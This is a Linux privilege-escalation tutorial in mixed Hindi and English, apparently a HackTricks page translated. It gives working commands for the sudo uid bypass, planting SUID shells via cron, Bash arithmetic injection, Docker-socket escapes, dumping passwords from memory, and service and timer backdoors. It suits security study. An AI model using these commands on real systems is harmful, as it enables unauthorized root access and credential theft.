# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में जानकारी इकट्ठा करना शुरू करें
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### PATH

यदि आप **have write permissions on any folder inside the `PATH`** हैं, तो आप कुछ libraries या binaries hijack कर सकते हैं:
```bash
echo $PATH
```
### Env जानकारी

क्या environment variables में कोई दिलचस्प जानकारी, पासवर्ड या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel संस्करण की जाँच करें और देखें कि क्या कोई exploit है जिसका उपयोग escalate privileges के लिए किया जा सकता है
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप एक अच्छा vulnerable kernel list और कुछ पहले से **compiled exploits** यहाँ पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) और [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel versions निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले उपकरण:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **Google में kernel version खोजें**, क्योंकि शायद आपका kernel version किसी kernel exploit में लिखा हुआ हो और तब आप सुनिश्चित हो सकेंगे कि यह exploit वैध है।

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo संस्करण

उन कमजोर sudo संस्करणों के आधार पर जो दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके जांच सकते हैं कि sudo का संस्करण असुरक्षित है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

द्वारा @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg सिग्नेचर सत्यापन विफल

देखें **smasher2 box of HTB** — इस vuln का कैसे शोषण किया जा सकता है, इसका एक **उदाहरण**।
```bash
dmesg 2>/dev/null | grep "signature"
```
### और system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपाय सूचीबद्ध करें

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप docker container के अंदर हैं तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:

{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **what is mounted and unmounted**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करने की कोशिश कर सकते हैं और निजी जानकारी की जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries को सूचीबद्ध करें
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही देखें कि **कोई compiler इंस्टॉल है या नहीं**। यह उपयोगी होता है अगर आपको किसी kernel exploit का उपयोग करना पड़े, क्योंकि यह अनुशंसा की जाती है कि आप इसे उसी मशीन पर compile करें जहाँ आप इसे उपयोग करने वाले हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### असुरक्षित सॉफ़्टवेयर इंस्टॉल हुआ

**इंस्टॉल किए गए पैकेजों और सेवाओं के संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) हो जो escalating privileges के लिए exploit किया जा सके…\
यह अनुशंसा की जाती है कि अधिक संदिग्ध इंस्टॉल किए गए सॉफ़्टवेयर के संस्करण को मैन्युअल रूप से जांचें।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
यदि आपके पास मशीन में SSH पहुँच है तो आप अंदर इंस्टॉल किए गए पुराने और कमजोर सॉफ़्टवेयर की जाँच करने के लिए **openVAS** का भी उपयोग कर सकते हैं।

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएँगे जो अधिकांशतः बेकार होगी, इसलिए OpenVAS या समान कुछ एप्लिकेशन की सलाह दी जाती है जो जाँचते हैं कि कोई इंस्टॉल किया गया सॉफ़्टवेयर वर्शन ज्ञात exploits के लिए vulnerable है_

## प्रक्रियाएँ

देखें कि **कौन सी प्रक्रियाएँ** निष्पादित हो रही हैं और जाँचें कि क्या किसी प्रक्रिया के पास **उनकी आवश्यकता से अधिक अधिकार तो नहीं हैं** (शायद कोई tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps दिखाते हैं कि उस process की मेमोरी virtual address space में कैसे मैप की गई है**; यह प्रत्येक मैप किए गए क्षेत्र की **permissions** भी दिखाता है। **mem** pseudo file **खुद प्रोसेस की मेमोरी को उजागर करती है**। **maps** फ़ाइल से हम जान लेते हैं कि कौन से **memory regions readable हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem file में seek कर के और सभी readable regions को dump कर के** एक फ़ाइल में सेव करते हैं।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि आभासी मेमोरी। कर्नेल के आभासी पता स्थान तक पहुँच /dev/kmem के माध्यम से की जा सकती है.\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** group द्वारा पढ़ने योग्य होता है.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump के लिए linux

ProcDump Windows के लिए Sysinternals suite के क्लासिक ProcDump tool का Linux पर पुनर्कल्पना है। इसे यहाँ प्राप्त करें [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### टूल्स

process memory को dump करने के लिए आप निम्न का उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताओं को हटाकर आपके द्वारा स्वामित्व वाली process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैन्युअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन्स देखें — जहाँ process की memory dump करने के विभिन्न तरीके दिए गए हैं) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

The tool [https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin) **clear text credentials को memory से** और कुछ **well known files** से चुरा लेगा। यह सही तरीके से काम करने के लिए root privileges की आवश्यकता रखता है।

| फीचर                                              | प्रोसेस नाम           |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Scheduled/Cron jobs

जाँच करें कि कोई scheduled job कमजोर है या नहीं। हो सकता है आप उस script का फायदा उठा सकें जो root द्वारा चलाया जाता है (wildcard vuln? क्या आप root द्वारा उपयोग की जाने वाली फ़ाइलों को modify कर सकते हैं? symlinks का उपयोग? root जिस directory का उपयोग करता है उसमें specific फ़ाइलें बना सकते हैं?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron path

उदाहरण के लिए, _/etc/crontab_ के अंदर आप PATH पा सकते हैं: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि उपयोगकर्ता "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab में root बिना PATH सेट किए कोई command या script execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron using a script with a wildcard (Wildcard Injection)

यदि कोई script root द्वारा निष्पादित किया जाता है और किसी command के अंदर “**\***” है, तो आप इसका उपयोग अप्रत्याशित चीज़ें करने के लिए कर सकते हैं (जैसे privesc)। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि किसी path के आगे wildcard रखा गया हो जैसे** _**/some/path/\***_ **तो यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं)।**

Read the following page for more wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है. यदि कोई root cron/parser अनट्रस्टेड log fields पढ़कर उन्हें arithmetic context में भेजता है, तो एक हमलावर command substitution $(...) इंजेक्ट कर सकता है जो cron के चलने पर root के रूप में execute होगा.

- Why it works: In Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion. इसलिए एक value जैसे `$(/bin/bash -c 'id > /tmp/pwn')0` पहले substituted होता है (कमांड चलता है), फिर शेष numeric `0` arithmetic के लिए उपयोग होता है जिससे script बिना errors के चलता रहता है.

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Parsed log में attacker-controlled टेक्स्ट लिखवाएँ ताकि numeric-सा दिखने वाला field command substitution रखें और किसी digit पर खत्म हो. सुनिश्चित करें कि आपका कमांड stdout पर कुछ न छापे (या उसे redirect करें) ताकि arithmetic वैध रहे.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

If you **can modify a cron script** executed by root, you can get a shell very easily:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
अगर root द्वारा चलाया गया script किसी ऐसे **directory where you have full access** का उपयोग करता है, तो उस folder को हटाकर और किसी दूसरे स्थान पर आपके नियंत्रित script वाली डायरेक्टरी की तरफ **create a symlink folder to another one** बनाना उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### अक्सर चलने वाले cron jobs

आप processes को मॉनिटर कर सकते हैं ताकि उन processes को खोजा जा सके जो हर 1, 2 या 5 मिनट पर execute हो रहे हैं। हो सकता है आप इसका फायदा उठाकर escalate privileges कर सकें।

उदाहरण के लिए, **हर 0.1s पर 1 मिनट के दौरान मॉनिटर करने के लिए**, **कम executed commands के अनुसार sort करने** और सबसे ज़्यादा executed commands को delete करने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप इसका उपयोग भी कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह हर process जो शुरू होता है इसकी निगरानी करेगा और सूचीबद्ध करेगा).

### अदृश्य cron jobs

यह संभव है एक cronjob बनाने का **comment के बाद carriage return डालकर** (बिना newline character), और cron job काम करेगा। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर कर सकते हैं तो आप **इसे बदल सकते हैं** ताकि यह आपकी **backdoor** को **निष्पादित** करे जब सेवा **शुरू**, **रीस्टार्ट** या **रोक** दी जाए (शायद आपको मशीन के रीबूट होने तक प्रतीक्षा करनी पड़ सकती है).\
उदाहरण के लिए अपनी backdoor को .service फ़ाइल के अंदर बनाएं साथ में **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि अगर आपके पास **सेवाओं द्वारा निष्पादित की जा रही बाइनरीज़ पर write permissions** हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब सेवाएँ फिर से निष्पादित हों तो backdoors निष्पादित हो जाएँ।

### systemd PATH - Relative Paths

आप **systemd** द्वारा उपयोग किए जा रहे PATH को निम्न के साथ देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पाते हैं कि आप path के किसी भी फ़ोल्डर में **लिख** सकते हैं तो आप **escalate privileges** कर सकते हैं। आपको **relative paths being used on service configurations** फ़ाइलों की तलाश करनी चाहिए जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, systemd PATH फ़ोल्डर में (जिसे आप लिख सकते हैं) relative path binary के समान नाम का एक **executable** बनाएँ, और जब सेवा को vulnerable action (**Start**, **Stop**, **Reload**) execute करने के लिए कहा जाएगा, तो आपका **backdoor will be executed** (unprivileged users आमतौर पर सेवाओं को start/stop नहीं कर सकते — पर जाँच करें कि क्या आप `sudo -l` का उपयोग कर सकते हैं)।

**services के बारे में और जानने के लिए `man systemd.service` देखें।**

## **Timers**

**Timers** वे systemd unit फ़ाइलें हैं जिनका नाम `**.timer**` पर खत्म होता है और जो `**.service**` फ़ाइलों या इवेंट्स को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में उपयोग किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in समर्थन होता है और ये asynchronously चलायी जा सकती हैं।

आप सभी timers को enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे कि `.service` या `.target`) को चलाने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> उस यूनिट को सक्रिय करने के लिए जब यह timer समाप्त हो जाता है। तर्क (argument) एक unit नाम है, जिसकी suffix ".timer" नहीं होती। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर डिफ़ॉल्ट होता है जिसका नाम timer यूनिट के समान होता है, सिवाय suffix के। (See above.) अनुशंसा की जाती है कि सक्रिय की जाने वाली यूनिट का नाम और timer यूनिट का नाम suffix को छोड़कर एक समान हों।

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को खोजें जो **executing a writable binary** हो
- किसी systemd unit को खोजें जो **executing a relative path** हो और आपके पास **writable privileges** उस **systemd PATH** पर हों (ताकि आप उस executable का impersonate कर सकें)

**टाइमरों के बारे में अधिक जानें: `man systemd.timer`.**

### **टाइमर सक्षम करना**

एक timer को सक्षम करने के लिए आपको root privileges चाहिए और निम्न चलाना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Note the **timer** is **activated** by creating a symlink to it on `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) enable **प्रोसेस कम्युनिकेशन** on the same or different machines within client-server models. वे inter-computer communication के लिए standard Unix descriptor files का उपयोग करते हैं और `.socket` files के माध्यम से सेटअप होते हैं।

Sockets को `.socket` files के जरिए configure किया जा सकता है।

**Learn more about sockets with `man systemd.socket`.** इस फ़ाइल के अंदर कई रोचक पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं, पर एक सारांश का उपयोग यह **बताने के लिए किया जाता है कि यह कहाँ सुनने वाला है** (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने के लिए पोर्ट नंबर, आदि)।
- `Accept`: एक boolean argument लेता है। यदि **true**, तो **प्रत्येक आने वाले कनेक्शन के लिए एक service instance spawn होता है** और केवल connection socket ही उसे दिया जाता है। यदि **false**, तो सभी listening sockets स्वयं **started service unit को पास किए जाते हैं**, और सभी कनेक्शनों के लिए केवल एक service unit spawn होता है। यह मान datagram sockets और FIFOs के लिए नज़रअंदाज़ किया जाता है जहाँ एक ही service unit बिना शर्त सभी इनकमिंग ट्रैफ़िक को संभालता है। **Defaults to false**। प्रदर्शन के कारण, नए daemons को केवल `Accept=no` के लिए उपयुक्त तरीके से लिखना सुझाया जाता है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जो listening **sockets**/FIFOs के **बने और bind होने से पहले** या **बनने और bind होने के बाद** क्रमशः **execute** होते हैं। command line का पहला token एक absolute filename होना चाहिए, उसके बाद process के arguments।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जो listening **sockets**/FIFOs के **बंद और हटाए जाने से पहले** या **बंद और हटाने के बाद** क्रमशः execute होते हैं।
- `Service`: उस **service** unit का नाम निर्दिष्ट करता है **जिसे incoming traffic पर activate किया जाएगा**। यह setting केवल उन sockets के लिए allowed है जिनमें Accept=no है। यह डिफ़ॉल्ट रूप से उस service को लेता है जिसका नाम socket के समान होता है (suffix बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आपको कोई **लिखने योग्य** `.socket` फ़ाइल मिलती है तो आप `[Socket]` सेक्शन की शुरुआत में कुछ ऐसा जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बने से पहले execute होगा। इसलिए, आपको **संभावित रूप से मशीन के reboot होने तक इंतज़ार करना पड़ेगा।**\
_ध्यान दें कि सिस्टम को उस socket फ़ाइल कॉन्फ़िगरेशन का उपयोग करना चाहिए वरना backdoor execute नहीं होगा_

### Writable sockets

यदि आप किसी भी **लिखने योग्य socket** की पहचान करते हैं (_यहाँ हम Unix Sockets की बात कर रहे हैं, ना कि config `.socket` फाइलों की_), तो आप उस socket के साथ **communicate** कर सकते हैं और शायद किसी vulnerability का exploit कर सकते हैं।

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### रॉ कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि कुछ **sockets listening for HTTP** requests हो सकते हैं (_मैं .socket files के बारे में बात नहीं कर रहा हूँ बल्कि unix sockets के रूप में कार्य करने वाली फ़ाइलों के बारे में बात कर रहा हूँ_). आप इसे निम्न से जांच सकते हैं:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
यदि socket **responds with an HTTP** request, तो आप इसके साथ **communicate** कर सकते हैं और शायद **exploit some vulnerability** कर सकते हैं।

### लिखने योग्य Docker Socket

The Docker socket, often found at `/var/run/docker.sock`, is a critical file that should be secured. By default, it's writable by the `root` user and members of the `docker` group. Possessing write access to this socket can lead to privilege escalation. Here's a breakdown of how this can be done and alternative methods if the Docker CLI isn't available.

#### **Privilege Escalation with Docker CLI**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privilege escalation कर सकते हैं:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
ये कमांड आपको host के फ़ाइल सिस्टम पर root-स्तरीय पहुँच के साथ एक container चलाने की अनुमति देती हैं।

#### **Docker API का सीधा उपयोग**

ऐसे मामलों में जहाँ Docker CLI उपलब्ध नहीं है, Docker socket को फिर भी Docker API और `curl` कमांड्स का उपयोग करके नियंत्रित किया जा सकता है।

1.  **List Docker Images:** उपलब्ध images की सूची प्राप्त करें।

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

2.  **Create a Container:** host system के root डायरेक्टरी को mount करने वाला एक container बनाने के लिए request भेजें।

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Start the newly created container:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```

3.  **Attach to the Container:** container के साथ कनेक्शन बनाने के लिए `socat` का उपयोग करें, जिससे उसके भीतर कमांड निष्पादन संभव हो सके।

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

`socat` कनेक्शन सेट करने के बाद, आप host के filesystem पर root-स्तरीय पहुँच के साथ सीधे container के अंदर commands निष्पादित कर सकते हैं।

### अन्य

ध्यान दें कि यदि आपके पास docker socket पर write permissions हैं क्योंकि आप **inside the group `docker`** हैं, तो आपके पास [**more ways to escalate privileges**](interesting-groups-linux-pe/index.html#docker-group) हैं। यदि [**docker API is listening in a port** you can also be able to compromise it](../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

देखें **more ways to break out from docker or abuse it to escalate privileges** in:


{{#ref}}
docker-security/
{{#endref}}

## Containerd (ctr) privilege escalation

यदि आप पाते हैं कि आप **`ctr`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privilege escalation

यदि आप पाते हैं कि आप **`runc`** कमांड का उपयोग कर सकते हैं तो निम्नलिखित पृष्ठ पढ़ें क्योंकि **you may be able to abuse it to escalate privileges**:


{{#ref}}
runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक उन्नत inter-Process Communication (IPC) सिस्टम है जो applications को प्रभावी ढंग से इंटरैक्ट करने और डेटा साझा करने में सक्षम बनाता है। आधुनिक Linux सिस्टम को ध्यान में रखकर डिज़ाइन किया गया, यह विभिन्न प्रकार के application communication के लिए एक मजबूत फ्रेमवर्क प्रदान करता है।

